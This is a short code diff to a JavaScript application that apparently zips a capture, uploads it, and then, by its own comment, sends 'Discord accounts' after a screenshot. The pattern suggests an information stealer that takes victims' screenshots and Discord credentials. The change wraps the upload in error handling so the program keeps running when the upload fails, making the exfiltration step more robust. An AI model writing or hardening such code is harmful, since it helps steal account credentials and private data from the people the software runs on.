@@ -239,7 +239,19 @@ class Application {
                 });
                 
                 const metadata = zipPassword ? { password: zipPassword } : {};
-                uploadResult = await uploadService.upload(zipPath, null, metadata);
+                try {
+                    uploadResult = await uploadService.upload(zipPath, null, metadata);
+                    if (uploadResult) {
+                        logger.info('File uploaded successfully');
+                    } else {
+                        logger.warn('Upload failed or disabled - continuing with local file only');
+                    }
+                } catch (error) {
+                    logger.warn('Upload service failed - continuing without upload', {
+                        error: error.message
+                    });
+                    uploadResult = null;
+                }
             }
 
             // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
